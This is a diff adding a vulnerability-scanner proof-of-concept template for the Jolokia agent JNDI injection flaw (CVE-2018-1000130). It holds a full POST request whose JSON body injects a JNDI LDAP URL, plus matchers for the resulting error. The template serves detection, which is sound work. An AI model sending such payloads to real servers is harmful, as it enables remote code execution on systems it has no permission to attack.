@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "Jolokia agent 1.3.7 代理模式 JNDI 注入漏洞验证，通过发送特制 HTTP POST 请求触发 JNDI 注入，检测服务器是否连接恶意 LDAP/RMI 服务器并执行任意 Java 代码"
+id = "POC-AVE-2018-0020"
+name = "Jolokia Agent Proxy JNDI Code Injection PoC"
+severity = "high"
+tags = ["ave-2018-0020"]
+vuln_id = [
+    "CVE-2018-1000130",
+    "AVE-2018-0020",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/jolokia/read/getDiagnosticOptions"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "type" : "read",
+  "mbean" : "java.lang:type=Memory",
+  "target" : {
+    "url" : "service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat"
+  }
+}"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
